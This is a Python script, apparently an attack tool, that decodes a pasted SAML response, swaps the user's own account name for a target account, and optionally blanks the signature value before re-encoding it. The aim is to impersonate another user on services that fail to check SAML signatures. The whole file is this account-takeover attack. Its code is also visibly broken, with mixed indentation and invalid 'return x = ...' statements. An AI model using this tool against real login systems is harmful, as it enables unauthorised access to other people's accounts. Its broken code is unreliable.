import sys
import base64
import requests
import urllib
import re


def SAMLRequest_Accounts():
	own_account = str(input("Please input own account registered for authentication: \n"))
    target_account = str(input("Please input the tempering target account: \n"))
    return own_account, target_account


def SAMLResponse_base64(SAMLResponse): 
	parsed_response = urllib.parse.unquote(SAMLResponse)
    parsed_response_bytes = parsed_response.encode('ascii')
    base64_bytes = base64.b64decode(parsed_response_bytes)
    base64_message = base64_bytes.decode('ascii')
    return base64_message


def SAMLtemper_account(base64_message, own_account, target_account): 
    return malicious_response = base64_message.replace(own_account,target_account)


def SAMLtemper_signature(malicious_response): 
    return malicious_response_without_signature = re.sub("<ds:SignatureValue>.*?</ds:SignatureValue>","<ds:SignatureValue></ds:SignatureValue>", malicious_response)


def SAMLResponse_tempered(malicious_response): 
    base64_response = malicious_response.encode('ascii')
    base64_bytes_response = base64.b64encode(base64_response)
    response_bytes = base64_bytes_response.decode('ascii')
    parsed_response = urllib.parse.quote(response_bytes, safe='/')
    return parsed_response



def main():
    SAMLResponse = str(input("Paste the SAMLResponse here: \n"))
    base64_message = SAMLResponse_base64(SAMLResponse)

    choice ='0'

    while (choice == '0'):

        print("MENU")
        print("1: temper with the account \n")
        print("2: temper with the account and signature \n")
        choice = input ("Please make a choice: ")

        if choice == "1":
        	# own_account = str(input("Please input own account registered for authentication: \n"))
        	# target_account = str(input("Please input the tempering target account: \n"))
        	own_account, target_account = SAMLRequest_Accounts()

        	malicious_response = SAMLtemper_account(base64_message,own_account,target_account)
        	parsed_response = SAMLResponse_tempered(malicious_response)

            print("The new SAMLResponse: \n", parsed_response)
            break
            
        elif choice == "2":
        	# own_account = str(input("Please input own account registered for authentication: \n"))
        	# target_account = str(input("Please input the tempering target account: \n"))
        	own_account, target_account = SAMLRequest_Accounts()

        	malicious_response = SAMLtemper_account(base64_message,own_account,target_account)
        	malicious_response_without_signature = SAMLtemper_signature(malicious_response)
        	parsed_response = SAMLResponse_tempered(malicious_response_without_signature)

            print("The new SAMLResponse: \n", parsed_response)
            break

        else:
            choice = '0'
        
   



if __name__ == '__main__':
    main()


